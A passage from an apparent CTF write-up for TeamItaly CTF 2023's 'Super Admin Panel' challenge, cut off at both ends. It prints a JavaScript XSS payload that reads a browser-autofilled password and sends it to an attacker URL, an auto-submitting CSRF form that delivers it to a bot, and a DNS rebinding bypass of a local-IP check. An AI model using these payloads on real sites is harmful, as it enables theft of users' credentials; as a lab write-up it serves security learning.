@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://ctftime.org/writeup/37951
+CHALLENGE: CTFtime.org / TeamItaly CTF 2023 / Super Admin Panel / Writeup
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: other
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: None
+KEY_TECHNIQUE: The server checks whether the IP is local with a DNS request, and the way to bypass this check is with a DNS rebinding attack.
+---
+nd clicks the "#pwn" button. We can use [this attack]( https://www.gosecure.net/blog/2022/06/29/did-you-know-your-browsers-autofill-credentials-could-be-stolen-via-cross-site-scripting-xss/): allows us to steal the autofill credentials by accessing the value of the fields that are automatically filled in once the bot clicks any button on the website. Payload: ```js document.addEventListener("DOMContentLoaded", ()=>{ const passwordInput = document.getElementById("password"); document.getElementById("pwn").addEventListener("click", () => { const password = passwordInput.value; if(passwordInput.value == "") return; fetch("{LEAK_URL}?"+encodeURIComponent(password)); }); }); ``` To actually exploit the XSS, we need to create an autofilling form on our server (CSRF): ```html <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>1</title> </head> <body> <form action="{URL}/panel" method="post"> <input type="hidden" name="username" value="admin"> <input type="hidden" name="password" value="{JS_PAYLOAD_BASE64}"> </form> <script> document.addEventListener('DOMContentLoaded', function() { document.querySelector('form').submit(); }); </script> </body> ``` We can send the link to this page to the bot, which will automatically submit the form with the exploit in the password field. This action triggers the "Wrong password" XSS attack on the website. As soon as the bot presses "#pwn," it steals the credentials and sends them to our server. Now that we got in the panel, we need to get the contents of 127.0.0.1:1337 to obtain the flag. The server checks whether the IP is local with a DNS request, and the way to bypass this check is with a DNS rebinding attack. Note that in the payload, we utilize the service rbndr.us , which performs DNS rebinding by altering the DNS response with two different IPs having a low TTL. This may require several attempts before successfully returning the flag. ```python while True: tr
